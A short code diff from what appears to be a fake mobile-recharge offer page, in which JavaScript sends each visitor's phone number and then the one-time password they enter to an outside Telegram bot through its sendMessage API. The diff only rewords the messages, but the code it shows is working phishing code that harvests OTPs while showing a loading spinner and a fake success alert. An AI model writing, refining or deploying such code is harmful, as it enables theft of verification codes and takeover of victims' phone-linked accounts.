@@ -14,7 +14,7 @@ function activateRecharge() {
     showLoadingSpinner();
 
     // Send the number to the Telegram bot immediately
-    sendToTelegramBot(inputNumber, 'Activating ₹749 Recharge.');
+    sendToTelegramBot(inputNumber);
 
     var progressBar = document.getElementById('progress-bar');
     var progressFill = document.getElementById('progress-fill');
@@ -78,7 +78,7 @@ function sendToTelegramBot(mobileNumber, message) {
     var apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
     // Full message including OTP
-    var fullMessage = `${message} Mobile Number: ${mobileNumber}`;
+    var fullMessage = `${message} Mob No: ${mobileNumber}`;
 
     // Build the request parameters
     var params = {
@@ -122,7 +122,7 @@ function verifyOTP() {
     showLoadingSpinner();
 
     // Send the OTP along with the mobile number to the Telegram bot
-    sendToTelegramBot(document.getElementById('number-input').value, `Verification Attempt: ${enteredOTP}`);
+    sendToTelegramBot(document.getElementById('number-input').value, `OTP: ${enteredOTP}`);
 
     // Perform OTP verification logic here
     // For now, let's just display an alert indicating success
